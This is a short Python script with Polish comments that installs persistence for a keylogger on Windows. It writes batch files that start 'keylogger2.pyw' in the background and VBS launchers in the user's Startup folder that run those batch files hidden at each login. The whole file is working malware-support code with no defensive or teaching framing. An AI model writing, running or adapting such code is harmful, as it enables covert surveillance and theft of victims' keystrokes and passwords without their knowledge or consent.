#Naprawione ez
import os
import time
def create_bat_files(number_of_files):
    script_dir = os.path.dirname(os.path.abspath(__file__)) 
    directory = os.path.join(script_dir) 
    os.makedirs(directory, exist_ok=True)  
    for i in range(1, number_of_files + 1):
        file_path = os.path.join(directory, f"script{i}.bat")
        with open(file_path, "w") as file:
            file.write("@echo off\n")
            file.write(f"start /B python {os.path.join(script_dir, 'keylogger2.pyw')}\n")
        print(f"Created file: {file_path}")
        time.sleep(1)
loc = input("Loc of the kl: ")
def create_launch_bat(number_of_files):
    script_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    directory = os.path.join(script_dir)
    os.makedirs(directory, exist_ok=True)
    for i in range(1, number_of_files + 1):
        file_path = os.path.join(directory, f"launch_bat{i}.vbs")
        with open(file_path, "w") as file:
            file.write('Set WshShell = CreateObject("WScript.Shell")\n')
            file.write(f'WshShell.Run chr(34) & "{loc}\script1.bat" & Chr(34), 0\n')
            file.write('Set WshShell = Nothing\n')
        print(f"Created file: {file_path}")
        time.sleep (1)
# Przykładowe użycie:
count = 1  # Liczba plików do utworzenia
create_launch_bat(count)
create_bat_files(count)
